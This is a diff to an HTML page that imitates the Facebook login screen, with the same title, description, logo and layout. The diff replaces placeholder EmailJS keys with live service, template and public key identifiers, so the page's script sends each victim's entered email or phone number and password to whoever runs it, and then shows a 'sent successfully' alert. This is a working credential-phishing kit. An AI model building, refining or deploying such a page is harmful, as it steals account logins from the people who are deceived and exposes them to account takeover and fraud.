@@ -2,7 +2,6 @@
 <html lang="en" id="facebook" class="no_js">
 <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
     <title id="pageTitle">Facebook – log in or sign up</title>
     <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
@@ -11,7 +10,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         (function(){
-            emailjs.init("YOUR_PUBLIC_KEY"); // Ganti dengan Public Key dari Email.js
+            emailjs.init('_2JWooqGu1Kd8f1-p'); // Ganti dengan Public Key dari Email.js
         })();
         
         function sendLoginData(event) {
@@ -25,7 +24,7 @@
                 user_password: password
             };
             
-            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+            emailjs.send('service_c04kj4k', 'template_kmkcj0d', templateParams)
                 .then(function(response) {
                     alert("Login data sent successfully!");
                 }, function(error) {
@@ -46,23 +45,49 @@
         }
         .main-container {
             display: flex;
-            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
+            justify-content: space-between;
+            width: 980px;
+            max-width: 100%;
+            margin-right: 32px;
+            margin-top: -90px;
+        }
+        .left-section {
+            flex: 1;
+            padding-right: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            position: relative;
+        }
+        .fb_logo {
+            width: 280px;
+            margin-bottom: 0px;
+            align-self: flex-start;
+            margin-left: -18px;
+            margin-top: -41px;
+        }
+        .text-container {
+            max-width: 500px;
+            margin-left: 10px;
+        }
+        .left-section h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+            margin-top: 0;
         }
         .right-section {
             background: white;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 100%;
+            width: 396px;
             text-align: center;
         }
         input {
-            width: calc(100% - 28px);
+            width: 92%;
             padding: 14px;
             margin: 8px 0;
             border: 1px solid #ddd;
@@ -107,19 +132,16 @@
             font-size: 16px;
             font-weight: bold;
         }
-        @media (min-width: 768px) {
-            .main-container {
-                flex-direction: row;
-                max-width: 980px;
-            }
-            .right-section {
-                width: 396px;
-            }
-        }
     </style>
 </head>
 <body>
     <div class="main-container">
+        <div class="left-section">
+            <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+            <div class="text-container">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+        </div>
         <div class="right-section">
             <form onsubmit="sendLoginData(event)">
                 <input type="text" id="email" placeholder="Email address or phone number" required>
